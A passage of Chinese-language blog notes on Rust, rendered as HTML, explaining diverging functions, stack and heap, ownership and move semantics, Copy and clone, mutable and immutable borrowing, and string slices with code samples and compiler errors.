</span><span class="language-bash">src/main.rs:6:24</span></span><br><span class="line">  |</span><br><span class="line">6 | fn add(x:u32,y:u32) -&gt; u32 &#123;</span><br><span class="line">  |    ---                 ^^^ expected `u32`, found `()` // 期望返回u32,却返回()</span><br><span class="line">  |    |</span><br><span class="line">  |    implicitly returns `()` as its body has no tail or `return` expression</span><br><span class="line">7 |     x + y;</span><br><span class="line">  |          - help: consider removing this semicolon</span><br></pre></td></tr></table></figure><p><strong>注意：只有表达式能返回值</strong>，而 <code>;</code> 结尾的是语句，在 Rust 中，一定要严格区分<strong>表达式</strong>和<strong>语句</strong>的区别，这个在其它语言中往往是被忽视的点。</p><h6 id="永不返回的发散函数"><a href="#永不返回的发散函数" class="headerlink" title="永不返回的发散函数 !"></a>永不返回的发散函数 <code>!</code></h6><p>当用 <code>!</code> 作函数返回类型的时候，表示该函数永不返回( diverge function )，特别的，这种语法往往用做会导致程序崩溃的函数：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">dead_end</span>() <span class="punctuation">-&gt;</span> ! &#123;</span><br><span class="line">  <span class="built_in">panic!</span>(<span class="string">&quot;你已经到了穷途末路，崩溃吧！&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的函数创建了一个无限循环，该循环永不跳出，因此函数也永不返回：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">forever</span>() <span class="punctuation">-&gt;</span> ! &#123;</span><br><span class="line">  <span class="keyword">loop</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="所有权和借用"><a href="#所有权和借用" class="headerlink" title="所有权和借用"></a>所有权和借用</h3><h4 id="所有权"><a href="#所有权" class="headerlink" title="所有权"></a>所有权</h4><p>所有的程序都必须和计算机内存打交道，如何从内存中申请空间来存放程序的运行内容，如何在不需要的时候释放这些空间，成了重中之重，也是所有编程语言设计的难点之一。在计算机语言不断演变过程中，出现了三种流派：</p><ul><li>**垃圾回收机制(GC)**，在程序运行时不断寻找不再使用的内存，典型代表：Java、Go</li><li><strong>手动管理内存的分配和释放</strong>, 在程序中，通过函数调用的方式来申请和释放内存，典型代表：C++</li><li><strong>通过所有权来管理内存</strong>，编译器在编译时会根据一系列规则进行检查</li></ul><p>其中 Rust 选择了第三种，最妙的是，这种检查只发生在编译期，因此对于程序运行期，不会有任何上的性能损失 </p><h5 id="栈和堆"><a href="#栈和堆" class="headerlink" title="栈和堆"></a>栈和堆</h5><p>栈和堆是编程语言最核心的数据结构，在rust中，值是位于栈还是堆上非常重要，这会影响程序的行为和性能</p><p>注意:栈和堆的核心目标就是为程序在运行时提供可供使用的内存空间</p><h6 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h6><p>栈按照顺序存储值并以相反顺序取出值，这中操作方式也被称作<strong>后进先出</strong>。</p><p>增加数据叫做进栈，减少数据叫做出栈</p><p>但是，栈中所有的数据都必须占用已知固定大小的内存空间，假设数据大小未知，那么在取出数据时，你讲无法取到你想要的数据</p><h6 id="堆"><a href="#堆" class="headerlink" title="堆"></a>堆</h6><p>与栈不同的是，当我们遇见大小未知或者可能变化的数据，我们就需要将其存储在堆上</p><p>当向堆上放入数据时，需要请求一定大小的内存空间。操作系统在对的没出找到一块足够大的空位，把它标记为已使用，不返回一个表示该位置地址的指针，该过程被称为在堆上分配内存</p><p>接着，<strong>该指针会被推入栈中</strong>，因为指针大小固定，在后续使用过程中，将通过栈中的指针，来获取数据在堆上的时机内存位置， 进而访问该数据</p><p>由上可知，堆是一种缺乏组织的数据结构</p><h6 id="性能区别"><a href="#性能区别" class="headerlink" title="性能区别"></a>性能区别</h6><p>在栈上分配内存比在堆上分配内存要快，因为入栈是操作系统无需调用函数来分配现代科技，只需要将新数据放入栈顶即可。相比之下，在堆上分配内存则需要更多的工作，这是因为操作系统必须首先找到一块足够存放数据的内存空间，接着做一些记录为下一次分配空间做准备，如果当前进程分配的内存页不足时，还需要进行系统调用来申请更多内存。 因此，处理器在栈上分配数据会比在堆上分配数据更加高效。</p><h6 id="所有权和堆栈"><a href="#所有权和堆栈" class="headerlink" title="所有权和堆栈"></a>所有权和堆栈</h6><p>当你的代码调用一个函数时，传递给函数的参数（包括可能指向堆上数据的指针和函数的局部变量）依次被压入栈中，当函数调用结束时，这些值将被从栈中按照相反的顺序依次移除。</p><p>因为堆上的数据缺乏组织，因此跟踪这些数据何时分配和释放是非常重要的，否则堆上的数据将产生内存泄漏 —— 这些数据将永远无法被回收。这就是 Rust 所有权系统为我们提供的强大保障。</p><p>对于其他很多编程语言，你确实无需理解堆栈的原理，但是<strong>在 Rust 中，明白堆栈的原理，对于我们理解所有权的工作原理会有很大的帮助</strong>。</p><h5 id="所有权原则"><a href="#所有权原则" class="headerlink" title="所有权原则"></a>所有权原则</h5><p>注意几点：</p><ol><li>Rust 中每一个值都被一个变量所拥有，该变量被称为值的所有者</li><li>一个值同时只能被一个变量所拥有，或者说一个值只能拥有一个所有者</li><li>当所有者（变量）离开作用域范围时，这个值将被丢弃(drop)</li></ol><h6 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h6><p>作用域是一个变量在程序中有效的范围，假如有这样一个 变量：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="string">&quot;hello&quot;</span>;</span><br></pre></td></tr></table></figure><p>变量 <code>s</code> 绑定到了一个字符串字面值，该字符串字面值是硬编码到程序代码中的。<code>s</code> 变量从声明的点开始直到当前作用域的结束都是有效的：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;                      <span class="comment">// s 在这里无效，它尚未声明</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="string">&quot;hello&quot;</span>;   <span class="comment">// 从此处起，s 是有效的</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 s</span></span><br><span class="line">&#125;                      <span class="comment">// 此作用域已结束，s不再有效</span></span><br></pre></td></tr></table></figure><p>简而言之，<code>s</code> 从创建开始就有效，然后有效期持续到它离开作用域为止，可以看出，就作用域来说，Rust 语言跟其他编程语言没有区别。</p><h5 id="变量绑定背后的数据交互"><a href="#变量绑定背后的数据交互" class="headerlink" title="变量绑定背后的数据交互"></a>变量绑定背后的数据交互</h5><h6 id="转移所有权"><a href="#转移所有权" class="headerlink" title="转移所有权"></a>转移所有权</h6><p>先来看一段代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = x;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码并没有发生所有权的转移，原因很简单： 代码首先将 <code>5</code> 绑定到变量 <code>x</code>，接着<strong>拷贝</strong> <code>x</code> 的值赋给 <code>y</code>，最终 <code>x</code> 和 <code>y</code> 都等于 <code>5</code>，因为整数是 Rust 基本数据类型，是固定大小的简单值，因此这两个值都是通过<strong>自动拷贝</strong>的方式来赋值的，都被存在栈中，完全无需在堆上分配内存。</p><p>整个过程中的赋值都是通过值拷贝的方式完成（发生在栈中），因此并不需要所有权转移。</p><p>我们在来看下面代码:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span>=<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">s2</span>=s1;</span><br></pre></td></tr></table></figure><p>对于基本类型（存储在栈上），Rust 会自动拷贝，但是 <code>String</code> 不是基本类型，而且是存储在堆上的，因此不能自动拷贝。</p><p>String类型是一个字符串类型，由存储在栈中的堆指针、字符串长度、字符串容器组成，其中堆指针是最重要的，它指向了真实存储字符串内容的堆指针</p><p>关于上面<code>let s2=s1</code>，分成两种方式讨论</p><ol><li>拷贝 <code>String</code> 和存储在堆上的字节数组 如果该语句是拷贝所有数据(深拷贝)，那么无论是 <code>String</code> 本身还是底层的堆上数据，都会被全部拷贝，这对于性能而言会造成非常大的影响</li><li>只拷贝 <code>String</code> 本身 这样的拷贝非常快，因为在 64 位机器上就拷贝了 <code>8字节的指针</code>、<code>8字节的长度</code>、<code>8字节的容量</code>，总计 24 字节，但是带来了新的问题，还记得我们之前提到的所有权规则吧？其中有一条就是：<strong>一个值只允许有一个所有者</strong>，而现在这个值（堆上的真实字符串数据）有了两个所有者：<code>s1</code> 和 <code>s2</code>。</li></ol><p>好吧，就假定一个值可以拥有两个所有者，会发生什么呢？</p><p>当变量离开作用域后，Rust 会自动调用 <code>drop</code> 函数并清理变量的堆内存。不过由于两个 <code>String</code> 变量指向了同一位置。这就有了一个问题：当 <code>s1</code> 和 <code>s2</code> 离开作用域，它们都会尝试释放相同的内存。这是一个叫做 <strong>二次释放（double free）</strong> 的错误，也是之前提到过的内存安全性 BUG 之一。两次释放（相同）内存会导致内存污染，它可能会导致潜在的安全漏洞。</p><p>因此，Rust 这样解决问题：<strong>当 <code>s1</code> 被赋予 <code>s2</code> 后，Rust 认为 <code>s1</code> 不再有效，因此也无需在 <code>s1</code> 离开作用域后 <code>drop</code> 任何东西，这就是把所有权从 <code>s1</code> 转移给了 <code>s2</code>，<code>s1</code> 在被赋予 <code>s2</code> 后就马上失效了</strong>。</p><p>所以在上面代码中，当s1的所有权转移到了s2之后，s1就没有用了</p><h6 id="克隆（深拷贝）"><a href="#克隆（深拷贝）" class="headerlink" title="克隆（深拷贝）"></a>克隆（深拷贝）</h6><p>首先，<strong>Rust 永远也不会自动创建数据的 “深拷贝”</strong>。因此，任何<strong>自动</strong>的复制都不是深拷贝，可以被认为对运行时性能影响较小。</p><p>如果我们实在想要胜读复制String堆上的数据，可以使用clone方法</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">let</span> <span class="variable">s2</span> = s1.<span class="title function_ invoke__">clone</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;s1 = &#123;&#125;, s2 = &#123;&#125;&quot;</span>, s1, s2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>能正常运行，没报错</p><h6 id="拷贝-浅拷贝"><a href="#拷贝-浅拷贝" class="headerlink" title="拷贝(浅拷贝)"></a>拷贝(浅拷贝)</h6><p>浅拷贝只发生在栈上，因此性能很高，在日常编程中，浅拷贝无处不在。</p><p>再回到之前看过的例子:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">y</span> = x;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;x = &#123;&#125;, y = &#123;&#125;&quot;</span>, x, y);</span><br></pre></td></tr></table></figure><p>但这段代码似乎与我们刚刚学到的内容相矛盾：没有调用 <code>clone</code>，不过依然实现了类似深拷贝的效果 —— 没有报所有权的错误。</p><p>因为<strong>任何基本类型的组合可以 <code>Copy</code> ，不需要分配内存或某种形式资源的类型是可以 <code>Copy</code> 的</strong>。如下是一些 <code>Copy</code> 的类型：</p><ul><li>所有整数类型，比如 <code>u32</code></li><li>布尔类型，<code>bool</code>，它的值是 <code>true</code> 和 <code>false</code></li><li>所有浮点数类型，比如 <code>f64</code></li><li>字符类型，<code>char</code></li><li>元组，当且仅当其包含的类型也都是 <code>Copy</code> 的时候。比如，<code>(i32, i32)</code> 是 <code>Copy</code> 的，但 <code>(i32, String)</code> 就不是</li><li>不可变引用 <code>&amp;T</code> ，例如<a href="https://course.rs/basic/ownership/ownership.html#%E8%BD%AC%E7%A7%BB%E6%89%80%E6%9C%89%E6%9D%83">转移所有权</a>中的最后一个例子，<strong>但是注意：可变引用 <code>&amp;mut T</code> 是不可以 Copy的</strong></li></ul><h4 id="引用与借用"><a href="#引用与借用" class="headerlink" title="引用与借用"></a>引用与借用</h4><p>如果仅仅支持通过转移所有权的方式获取一个值，那会让程序变得复杂。因此，Rust通过借用来获取一个值，<strong>获取变量的引用，称之为借用</strong></p><p>借用分为两种类型：</p><ol><li><strong>不可变引用</strong>：允许多个借用者同时读取该值，但不允许修改。</li><li><strong>可变引用</strong>：只允许一个借用者修改该值，但在借用期间不能有其他借用者。</li></ol><h5 id="引用和解引用"><a href="#引用和解引用" class="headerlink" title="引用和解引用"></a>引用和解引用</h5><p>常规引用时一个指针类型，指向了对象存储的内存地址。在下面代码中，我们创建了一个i32的值引用y，然后使用解引用运算符来解出y所使用的值:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x; <span class="comment">//引用类型</span></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,x);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>,*y);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert_eq!</span>(<span class="number">5</span>, x);</span><br><span class="line">    <span class="built_in">assert_eq!</span>(<span class="number">5</span>, *y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用&amp;来引用一个变量，然后使用*来解引用这个变量</p><h5 id="不可变引用"><a href="#不可变引用" class="headerlink" title="不可变引用"></a>不可变引用</h5><p>下面的代码，我们用 <code>s1</code> 的引用作为参数传递给 <code>calculate_length</code> 函数，而不是把 <code>s1</code> 的所有权转移给该函数：                                                                                                                                                                                       </p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s1</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">len</span> = <span class="title function_ invoke__">calculate_length</span>(&amp;s1);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;The length of &#x27;&#123;&#125;&#x27; is &#123;&#125;.&quot;</span>, s1, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">calculate_length</span>(s: &amp;<span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123;</span><br><span class="line">    s.<span class="title function_ invoke__">len</span>()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到：</p><ol><li>无需像上章一样：先通过函数参数传入所有权，然后再通过函数返回来传出所有权，代码更加简洁</li><li><code>calculate_length</code> 的参数 <code>s</code> 类型从 <code>String</code> 变为 <code>&amp;String</code></li></ol><p>在这里，<code>&amp;</code>符号即是引用，他们允许你使用值，但是不获取所有权</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202503282101141.png" alt="image-20250328210117010" loading="lazy"></p><p>通过&amp;s1语法，我们创建了一个指向s1的引用，但是并不拥有他。因为并不拥有这个值，当离开作用域后，其指向的值也不会被丢弃。</p><p>同理，函数 <code>calculate_length</code> 使用 <code>&amp;</code> 来表明参数 <code>s</code> 的类型是一个引用：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">calculate_length</span>(s: &amp;<span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">usize</span> &#123; <span class="comment">// s 是对 String 的引用</span></span><br><span class="line">    s.<span class="title function_ invoke__">len</span>()</span><br><span class="line">&#125; <span class="comment">// 这里，s 离开了作用域。但因为它并不拥有引用值的所有权，</span></span><br><span class="line">  <span class="comment">// 所以什么也不会发生</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意：<strong>借用的变量不可修改</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">change</span>(&amp;s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">change</span>(some_string: &amp;<span class="type">String</span>) &#123;</span><br><span class="line">    some_string.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里尝试在s里添加<code>，world</code>，但是会报错</p><h5 id="可变引用"><a href="#可变引用" class="headerlink" title="可变引用"></a>可变引用</h5><p>我们知道用let直接定义的变量的值不可修改，但我们使用mut后，就可修改了</p><p>我们修改上面报错代码</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">change</span>(&amp;<span class="keyword">mut</span> s);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">change</span>(some_string: &amp;<span class="keyword">mut</span> <span class="type">String</span>) &#123;</span><br><span class="line">    some_string.<span class="title function_ invoke__">push_str</span>(<span class="string">&quot;, world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出hello，world</p><p><strong>可变引用同时只能存在一个</strong></p><p>不过可变引用并不是随心所欲、想用就用的，它有一个很大的限制： <strong>同一作用域，特定数据只能有一个可变引用</strong>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">r1</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"><span class="keyword">let</span> <span class="variable">r2</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, r1, r2);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>会报一个错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">error[E0499]: cannot borrow `s` as mutable more than once at a time 同一时间无法对 `s` 进行两次可变借用</span><br><span class="line"> --&gt; src/main.rs:5:14</span><br><span class="line">  |</span><br><span class="line">4 |     let r1 = &amp;mut s;</span><br><span class="line">  |              ------ first mutable borrow occurs here 首个可变引用在这里借用</span><br><span class="line">5 |     let r2 = &amp;mut s;</span><br><span class="line">  |              ^^^^^^ second mutable borrow occurs here 第二个可变引用在这里借用</span><br><span class="line">6 |</span><br><span class="line">7 |     println!(&quot;&#123;&#125;, &#123;&#125;&quot;, r1, r2);</span><br><span class="line">  |                        -- first borrow later used here 第一个借用在这里使用</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码出错的原因在于，第一个可变借用 <code>r1</code> 必须要持续到最后一次使用的位置 <code>println!</code>在 <code>r1</code> 创建和最后一次使用之间，我们又尝试创建第二个可变借用 <code>r2</code>。</p><p>我们改写成下面这种形式</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">r1</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, r1);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">r2</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, r2);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就避免了在同一时间有多个可变引用指向数据，r1变量在<code>println!</code>后就离开作用域了，后面只存在r2一个可变引用指向数据</p><p>这种限制的好处就是使 Rust 在编译期就避免数据竞争，数据竞争可由以下行为造成：</p><ul><li>两个或更多的指针同时访问同一数据</li><li>至少有一个指针被用来写入数据</li><li>没有同步数据访问的机制</li></ul><p>数据竞争会导致未定义行为，这种行为很可能超出我们的预期，难以在运行时追踪，并且难以诊断和修复。而 Rust 避免了这种情况的发生，因为它甚至不会编译存在数据竞争的代码！</p><p>很多时候，大括号可以帮我们解决一些编译不通过的问题，通过手动限制变量的作用域：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">r1</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// r1 在这里离开了作用域，所以我们完全可以创建一个新的引用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">r2</span> = &amp;<span class="keyword">mut</span> s;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>可变引用与不可变引用不能同时存在</strong></p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">r1</span> = &amp;s; <span class="comment">// 没问题</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">r2</span> = &amp;s; <span class="comment">// 没问题</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">r3</span> = &amp;<span class="keyword">mut</span> s; <span class="comment">// 大问题</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;, and &#123;&#125;&quot;</span>, r1, r2, r3);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总的来说，借用规则如下：</p><ul><li>同一时刻，你只能拥有要么一个可变引用，要么任意多个不可变引用</li><li>引用必须总是有效的</li></ul><h5 id="悬垂引用"><a href="#悬垂引用" class="headerlink" title="悬垂引用"></a>悬垂引用</h5><p>悬垂引用也叫做悬垂指针，意思为指针指向某个值后，这个值被释放掉了，而指针仍然存在，其指向的内存可能不存在任何值或已被其它变量重新使用。在 Rust 中编译器可以确保引用永远也不会变成悬垂状态：当你获取数据的引用后，编译器可以确保数据不会在引用结束前被释放，要想释放数据，必须先停止其引用的使用。</p><h3 id="复合类型"><a href="#复合类型" class="headerlink" title="复合类型"></a>复合类型</h3><h4 id="字符串与切片"><a href="#字符串与切片" class="headerlink" title="字符串与切片"></a>字符串与切片</h4><h5 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h5><p>切片并不是Rust独有的，其他语言都有，它允许你引用集合中部分连续的元素序列</p><p>对于字符串来说，切片就是对String类型某一部分的引用</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">hello</span> = &amp;s[<span class="number">0</span>..<span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">world</span> = &amp;s[<span class="number">6</span>..<span class="number">11</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hello没有引用整个String s，而是引用s的一部分内容，通过[0..5]的方式来指定</p><p>这就是创建切片的语法，使用方括号包括的一个序列：**[开始索引..终止索引]**</p><p>对于 <code>let world = &amp;s[6..11];</code> 来说，<code>world</code> 是一个切片，该切片的指针指向 <code>s</code> 的第 7 个字节(索引从 0 开始, 6 是第 7 个字节)，且该切片的长度是 <code>5</code> 个字节。</p><p>在使用 Rust 的 <code>..</code> <a href="https://course.rs/basic/base-type/numbers.html#%E5%BA%8F%E5%88%97range">range 序列</a>语法时，如果你想从索引 0 开始，可以使用如下的方式，这两个是等效的：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">slice</span> = &amp;s[<span class="number">0</span>..<span class="number">2</span>];</span><br><span class="line"><span class="keyword">let</span> <span class="variable">slice</span> = &amp;s[..<span class="number">2</span>];</span><br></pre></td></tr></table></figure><p>同样的，如果你的切片想要包含 <code>String</code> 的最后一个字节，则可以这样使用：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">len</span> = s.<span class="title function_ invoke__">len</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="variable">slice</span> = &amp;s[<span class="number">4</span>..len];</span><br><span 